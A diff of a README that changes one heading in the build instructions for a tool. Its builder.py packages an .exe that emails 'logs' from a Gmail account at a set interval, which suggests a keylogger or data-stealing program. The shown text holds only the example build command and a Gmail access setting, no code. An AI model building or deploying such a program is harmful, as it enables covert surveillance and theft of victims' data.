@@ -8,7 +8,7 @@ To create an .exe file using the data you need, you need to run builder.py from 
  using comand line arguments.
 Information about the comand line arguments can be obtained by typing in the terminal:
 >python3 builder.py -h 
-#####Example comand to create ".exe" file:
+###Example comand to create ".exe" file:
 >python3 builder.py -e example.email@gmail.com -p email_password -d 600 -f result_filename.py
 ## Gmail Security Settings
 For the code to successfully send messages with logs, you need allow @gmail access to third party apps here:
